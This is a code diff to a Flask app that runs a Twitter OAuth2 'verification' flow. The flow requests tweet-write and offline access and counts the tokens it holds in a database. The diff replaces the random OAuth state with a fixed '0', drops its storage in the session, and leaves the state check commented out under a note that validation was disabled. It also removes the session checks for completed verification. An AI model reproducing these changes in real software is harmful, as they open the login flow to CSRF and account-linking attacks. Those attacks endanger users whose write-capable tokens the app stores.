@@ -141,10 +141,9 @@ def home():
         return render_template('veriwelcome.html', message=message, redirect_url=VERIFY_REDIRECT_URL)
 
     if request.args.get('authorize') == 'true':
-        state = generate_code_verifier_and_challenge()[0][:10]  # Use first 10 chars of verifier as state
+        state = "0"
         code_verifier, code_challenge = generate_code_verifier_and_challenge()
         session['code_verifier'] = code_verifier
-        session['oauth_state'] = state
 
         authorization_url = (
             f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
@@ -167,7 +166,7 @@ def home():
         data = {
             'grant_type': 'authorization_code',
             'code': code,
-            'redirect_uri': f"{CALLBACK_URL}verify",
+            'redirect_uri': CALLBACK_URL,
             'code_verifier': code_verifier
         }
 
@@ -252,22 +251,30 @@ def verify():
     state = request.args.get('state')
     error = request.args.get('error')
 
+    # Check if authorization is in progress (if 'verify' flag is present)
     if request.args.get('verify') == 'true':
-        state = generate_code_verifier_and_challenge()[0][:8]  # Use first 8 chars of verifier as state for verify
+        state = "0"  # Reset state
         code_verifier, code_challenge = generate_code_verifier_and_challenge()
         session['code_verifier'] = code_verifier
-        session['oauth_state'] = state
 
         authorization_url = (
             f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
-            f"redirect_uri={CALLBACK_URL}verify&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
+            f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
             f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
         )
         return redirect(authorization_url)
 
+    # If the code exists, attempt to fetch access tokens and handle verification
     if code:
         if error:
             return f"Error during authorization: {error}", 400
+
+        # Validate the state (if necessary, for security purposes)
+        # Since you disabled state validation, you can skip or customize it:
+        # if state != session.get('oauth_state', '0'):
+        #     return "Invalid state parameter", 403
+        # else:
+        #     return "Invalid state parameter", 403
 
         code_verifier = session.get('code_verifier')
         token_url = "https://api.twitter.com/2/oauth2/token"
@@ -302,8 +309,8 @@ def verify():
                     f"📊 Total Tokens in Database: {total_tokens}"
                 )
 
+                # Custom welcome message
                 message = f"Verification successful for @{username}!"
-                session['verification_complete'] = True
                 return render_template('veriwelcome.html', message=message, redirect_url=VERIFY_REDIRECT_URL)
             else:
                 return "Error retrieving user info with access token", 400
@@ -312,16 +319,8 @@ def verify():
             error_code = token_response.get('error', 'No error code')
             return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
 
-    if 'username' in session:
-        username = session['username']
-        message = f"Verification successful for @{username}!"
-        return render_template('veriwelcome.html', message=message, redirect_url=VERIFY_REDIRECT_URL)
-    
-    if not session.get('verification_complete'):
-        return render_template('verify.html')
-    
-    message = "Please verify your Twitter account to continue"
-    return render_template('veriwelcome.html', message=message, redirect_url=VERIFY_REDIRECT_URL)
+    return render_template('verify.html')
+
 
 @app.route('/logout')
 def logout():
